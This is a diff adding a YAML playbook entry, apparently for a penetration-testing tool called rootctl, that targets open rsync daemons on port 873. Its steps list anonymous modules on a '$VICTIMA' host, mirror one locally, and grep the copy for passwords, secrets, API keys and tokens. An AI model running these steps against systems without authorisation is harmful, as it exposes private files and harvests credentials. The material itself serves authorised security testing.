@@ -1,0 +1,33 @@
+chain_id: rsync_anonymous
+title: "rsync — list and pull anonymous modules"
+severity: MEDIUM
+tags: [rsync, recon, anonymous, file-disclosure]
+
+trigger:
+  any_of:
+    - { port: 873 }
+    - { service: rsync }
+    - { service_pattern: "(?i)rsync" }
+
+description: |
+  Open rsync daemon. Most production rsyncd instances expose at least
+  one read-only "module" — backups, mirrors, package repositories. List
+  the modules anonymously, pull them, then triage with rootctl extract.
+
+steps:
+  - id: 1
+    title: "List modules"
+    command: rsync rsync://$VICTIMA/
+
+  - id: 2
+    title: "Mirror a module"
+    command: rsync -av --no-motd rsync://$VICTIMA/MODULE/ ./pull/
+
+  - id: 3
+    title: "Triage with rootctl"
+    command: |
+      grep -RIE 'password|secret|api[_-]?key|token' ./pull/ 2>/dev/null
+      rootctl extract ./pull/<interesting-file>
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync
